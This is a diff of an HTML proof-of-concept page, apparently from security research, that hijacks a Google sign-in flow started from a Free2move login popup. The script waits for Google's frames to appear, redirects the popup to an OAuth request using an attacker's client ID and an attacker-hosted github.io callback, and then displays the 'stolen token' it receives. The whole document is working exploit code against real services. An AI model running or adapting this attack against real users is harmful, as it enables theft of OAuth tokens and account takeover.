@@ -2,50 +2,57 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>SSO PoC</title>
+  <title>SSO Hijack URL</title>
   <script>
   (function(){
-    // 1) Read the target Free2move login URL from ?url=
-    const target = new URLSearchParams(location.search).get('url');
-    if (!target) {
-      document.body.textContent = 'Missing ?url parameter.';
-      return;
-    }
+    // Read the target from ?target=
+    const target = new URLSearchParams(location.search).get('target');
+    if (!target) return alert('Missing ?target parameter.');
 
-    // 2) Open the real login page in a popup
-    const popup = window.open(target, 'sso_login', 'width=600,height=800');
+    // Listen for the token from the child
+    window.addEventListener('message', e => {
+      if (e.origin !== location.origin) return;
+      if (e.data.type === 'got_token') {
+        alert('🥷 Stolen token:\n' + e.data.token);
+      }
+    });
 
-    // 3) Prepare attacker OAuth redirect
-    const attackerClientId = 'YOUR_ATTACKER_CLIENT_ID';
-    const attackerRedirect = 'https://YOUR_CALLBACK_DOMAIN/callback.html';
-    const authUrl = [
-      'https://accounts.google.com/o/oauth2/v2/auth',
-      `?client_id=${attackerClientId}`,
-      `&redirect_uri=${encodeURIComponent(attackerRedirect)}`,
-      `&response_type=token`,
-      `&scope=email%20profile`,
-      `&prompt=select_account`
-    ].join('');
+    // 1) Open Free2move’s login
+    const popup = window.open(
+      target,
+      'sso_window',
+      'width=600,height=800'
+    );
 
-    // 4) Poll the popup’s frame count until it looks like Google’s flow
+    // 2) Build the attacker OAuth URL
+    const ATTACKER_CLIENT_ID = '973721409870-vd46nngkltk55ro9jp509ov1133m5s74.apps.googleusercontent.com';
+    const REDIRECT_URI       = 'https://eunoiia.github.io/sso-poc/callback.html';
+    const authUrl = 
+      'https://accounts.google.com/o/oauth2/v2/auth' +
+      '?client_id='    + encodeURIComponent(ATTACKER_CLIENT_ID) +
+      '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) +
+      '&response_type=token' +
+      '&scope=email%20profile' +
+      '&prompt=select_account'
+    ;
+
+    // 3) Poll for Google’s frames (≥2)
     const tid = setInterval(() => {
-      try {
-        const frames = popup.frames.length;
-        console.log('frames=', frames);
-        // Google’s embedded flow typically spawns 2+ frames
-        if (frames >= 2) {
-          clearInterval(tid);
-          // hijack the OAuth flow
-          popup.location.replace(authUrl);
-        }
-      } catch (e) {
-        // cross-origin errors are fine; keep polling
+      let frames = 0;
+      try { frames = popup.frames.length; }
+      catch(_) { /* cross-origin until they appear */ }
+
+      if (frames >= 2) {
+        clearInterval(tid);
+        // hijack the OAuth handshake
+        popup.location.replace(authUrl);
       }
     }, 300);
   })();
   </script>
 </head>
 <body>
-  <p>Launching SSO…</p>
+  <h1>Launching SSO…</h1>
+  <p>If you see a popup, click “Sign in with Google” to proceed.</p>
 </body>
 </html>
